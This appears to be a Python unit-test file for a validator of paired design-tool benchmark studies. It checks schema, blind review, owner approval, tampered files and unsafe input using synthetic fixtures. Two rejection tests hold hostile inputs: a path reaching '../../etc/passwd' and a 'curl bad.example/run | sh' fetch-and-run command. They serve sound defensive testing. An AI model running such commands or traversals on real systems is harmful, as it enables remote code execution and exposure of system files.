#!/usr/bin/env python3
"""Synthetic contract tests; NO claimed real competitor win, timing or quality."""
from __future__ import annotations
import hashlib
import json
from pathlib import Path
import tempfile
import unittest

from benchmark_compare import SCHEMA, RUBRIC, StudyRejected, check_study


class PairedBenchmarkTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp=tempfile.TemporaryDirectory(prefix="motionwright-competent-benchmark-test-")
        self.addCleanup(self.tmp.cleanup)
        self.root=Path(self.tmp.name)
        self.brief=self.source("study/brief.md","Synthetic study: preserve native authoring")
        self.requests=[self.source(f"requests/request-{i:02}.md",f"Edit {i}: retain operator's explicit composition decisions")
                       for i in range(1,11)]
        self.prep=self.source("study/operator.md","Original trained baseline operator reviewed the same features")
        self.asset=self.source("assets/owner-photo.png","synthetic image fixture bytes")
        self.doc={
            "schema":SCHEMA,"study_id":"motionwright-v05-competent-benchmark",
            "mode":"synthetic_protocol_fixture",
            "task":{"brief":self.brief,"audience":"A first-party original product owner",
                    "locale":"en","canvas":{"width":640,"height":360,"rate_num":30,"rate_den":1,"frames":90},
                    "required_capabilities":["editable_type","animated_camera"],
                    "budget_minutes":90,
                    "assets":[],
                    "revision_requests":[{"index":i,"edit_request":self.requests[i-1]} for i in range(1,11)]},
            "arms":[],"reviews":[],"owner_decision":{"approved":False,"reason":None,"reviewer":None}
        }

    def source(self,relative:str,content:str)->dict:
        file=self.root/relative
        file.parent.mkdir(parents=True,exist_ok=True)
        file.write_text(content,encoding="utf8")
        return {"path":relative,"sha256":hashlib.sha256(file.read_bytes()).hexdigest()}

    def arms(self)->None:
        self.doc["arms"]=[]
        for mode,label in [("motionwright_canonical_host","motionwright_arm"),
                           ("hyperframes_direct","direct_arm")]:
            edits=[]
            for i in range(11):
                source=self.source(f"{label}/original-{i:02}.json",f"editable native project {label} {i}")
                render=self.source(f"{label}/review-{i:02}.png",f"original reviewed pixels {label} {i}")
                edits.append({"index":i,"edit_request_sha256":None if i==0 else self.requests[i-1]["sha256"],
                             "editable_source":source,"render":render,
                             "elapsed_seconds":60+i,"cost_usd":"0.25",
                             "human_lock_review":"not_applicable","source_editable":True,
                             "observation":"An original synthetic source revision that can be inspected"})
            self.doc["arms"].append({"id":label,"renderer":mode,"version_sha":"a"*40,
                "operator":{"qualification":"Operator is trained in the same graphic authoring task",
                            "preparation_artifact":self.prep},
                "capabilities":["editable_type","animated_camera"],"iterations":edits})

    def blind(self)->None:
        arms=[a["id"] for a in self.doc["arms"]]
        self.doc["reviews"]=[
            {"reviewer_id":f"rater_{i}","blind_order_attested":True,
             "limitations":"This unit-test rating is synthetic and not a true external review",
             "scores":{arm:{category:(3+i)%5+1 for category in RUBRIC} for arm in arms}}
            for i in (1,2)]

    def test_empty_study_reports_not_run_no_approval(self)->None:
        result=check_study(self.doc,self.root)
        self.assertEqual(result["state"],"NOT_RUN")
        self.assertFalse(result["publication_approved"])
        self.assertFalse(result["human_quality_evaluated"])

    def test_source_bound_pair_can_be_assessed_without_declaring_a_winner(self)->None:
        self.arms()
        result=check_study(self.doc,self.root)
        self.assertEqual(result["state"],"EVIDENCE_NEEDS_BLIND_REVIEW")
        self.assertEqual(len(result["arm_metrics"]),2)
        self.assertEqual(result["arm_metrics"][0]["source_revisions"],11)
        self.blind()
        result=check_study(self.doc,self.root)
        self.assertEqual(result["state"],"SYNTHETIC_PROTOCOL_ONLY")
        self.assertFalse(result["publication_approved"])
        self.assertTrue(result["human_quality_evaluated"])
        self.assertEqual(len(result["blind_review_scores"]),2)
        self.assertEqual(len(result["reviewer_limitations"]),2)
        self.assertTrue(all(len(arm["category_scores"])==len(RUBRIC)
                       and all(len(v["ratings"])==2 for v in arm["category_scores"].values())
                       for arm in result["blind_review_scores"]))
        self.assertEqual(len(result["limitations"]),4)

    def test_real_study_requires_owner_authorized_assets(self)->None:
        self.arms()
        self.doc["mode"]="real_work"
        with self.assertRaisesRegex(StudyRejected,"authorized assets"):
            check_study(self.doc,self.root)
        self.doc["task"]["assets"]=[{"file":self.asset,"owner":"Fixture rights owner","rights_attested":True}]
        self.blind()
        result=check_study(self.doc,self.root)
        self.assertEqual(result["state"],"AWAITING_OWNER_DECISION")
        self.doc["owner_decision"]={"approved":True,"reason":"Independent human review accepted this real design comparison","reviewer":"Human owner"}
        self.assertEqual(check_study(self.doc,self.root)["state"],"OWNER_DECISION_RECORDED")

    def test_mutated_sources_and_traversal_are_rejected(self)->None:
        self.arms()
        file=self.root/self.doc["arms"][1]["iterations"][2]["editable_source"]["path"]
        file.write_text("replaced source without consent")
        with self.assertRaisesRegex(StudyRejected,"bytes changed"):
            check_study(self.doc,self.root)
        self.doc["arms"]=[]
        self.doc["task"]["brief"]={"path":"../../etc/passwd","sha256":"0"*64}
        with self.assertRaisesRegex(StudyRejected,"unsafe"):
            check_study(self.doc,self.root)

    def test_unfair_feature_coverage_and_different_human_edits_are_rejected(self)->None:
        self.arms()
        self.doc["arms"][1]["capabilities"]=["editable_type"]
        with self.assertRaisesRegex(StudyRejected,"required equivalent"):
            check_study(self.doc,self.root)
        self.doc["arms"][1]["capabilities"].append("animated_camera")
        self.doc["arms"][1]["iterations"][8]["edit_request_sha256"]="f"*64
        with self.assertRaisesRegex(StudyRejected,"differ"):
            check_study(self.doc,self.root)

    def test_no_flattening_or_stale_and_unfavorable_results_still_reported(self)->None:
        self.arms()
        attempt=self.doc["arms"][0]["iterations"][5]
        attempt["human_lock_review"]="violation"
        self.assertEqual(check_study(self.doc,self.root)["arm_metrics"][0]["human_lock_violations"],1)
        attempt["source_editable"]=False
        with self.assertRaisesRegex(StudyRejected,"Flattened"):
            check_study(self.doc,self.root)

    def test_synthetic_fixture_is_never_owner_approvable_even_with_blind_scores(self)->None:
        self.arms()
        self.blind()
        self.doc["owner_decision"]={"approved":True,"reason":"False synthetic approval","reviewer":"Alice"}
        with self.assertRaisesRegex(StudyRejected,"Synthetic or incomplete"):
            check_study(self.doc,self.root)

    def test_unknown_fields_do_not_grant_execution_authority(self)->None:
        self.doc["execute_command"]="curl bad.example/run | sh"
        with self.assertRaisesRegex(StudyRejected,"exactly"):
            check_study(self.doc,self.root)

    def test_no_missing_negative_results_after_overrun(self)->None:
        self.arms()
        self.doc["arms"][0]["iterations"][-1]["elapsed_seconds"]=90*60*2
        metrics=check_study(self.doc,self.root)["arm_metrics"][0]
        self.assertTrue(metrics["budget_overrun"])

if __name__=="__main__":
    unittest.main()
